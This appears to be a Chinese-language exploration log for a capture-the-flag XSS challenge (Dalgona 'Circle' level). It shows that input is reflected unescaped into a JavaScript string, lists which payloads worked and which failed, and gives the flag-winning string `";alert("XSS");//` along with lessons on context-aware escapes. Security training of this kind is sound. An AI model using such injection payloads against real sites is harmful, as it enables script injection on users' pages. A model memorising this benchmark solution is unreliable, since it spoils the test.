# xben-059-24 · 探索记录

对应题解：[`xben-059-24.md`](./xben-059-24.md)

## 目标与起点

容器 `10.0.172.217:5000`，`Werkzeug/1.0.1 Python/2.7.18`。`/` 是 Dalgona 关卡列表，
`/page` 是第 6 关（`xss6.css`，标题 `Dalgona - Circle`）。

`/page` 的反射点：

```html
<script> var name = "TESTX"; document.write('Hello ' + name); </script>
```

输入进的是 **JS 双引号字符串**，不是 HTML 文本节点。

## 第一阶段：确认哪些字符被处理

用 `Q<ch>Q` 提交（`GET /page?name=...`），看反射后的 `var name = ...`：

| 字符 | 结果 |
| --- | --- |
| `<` `>` `'` `;` `(` `=` 空格 | 原样保留 |
| `"` | 原样保留（字符串被提前闭合） |

结论：没有字符过滤，属于「未转义拼进 JS」而不是「黑名单」。

## 第二阶段：按 JS 语法打断

| 输入 | 结果 |
| --- | --- |
| `";alert("XSS");//` | **flag** |
| `";alert(1);//` | `Oops! You did an alert with 1 instead of "XSS"` |
| `";alert("XSS");` | `TypeError: Attempting to change the …` |
| `;alert('XSS');//` | `TypeError`（没跳出字符串） |

`alert(1)` 的文案直接说明判据是「参数必须等于 XSS」。

## 走不通 / 走过的弯路（留档）

| 方向 | 结果 | 判据 |
| --- | --- | --- |
| 不闭合双引号，只写 `;alert('XSS');//` | `TypeError` | 仍留在字符串字面量里，没执行 |
| 闭合但省掉 `//` | `TypeError` | 尾部 `"; document.write(...)` 被当成代码继续解析 |
| `alert(1)` | 明确的失败文案 | 判据是参数值，不是「有没有弹窗」 |

## 这次真正的收获

1. **反射点决定 payload 形状。** HTML 文本节点用标签，JS 字符串用引号闭合 + 注释。
2. **`//` 是 JS 字符串逃逸里最容易被忘掉的一半。** 不注释尾部就会语法错误。
3. **利用失败文案确认判据。** `alert(1)` 回显 `instead of "XSS"`，直接告诉你要什么参数。
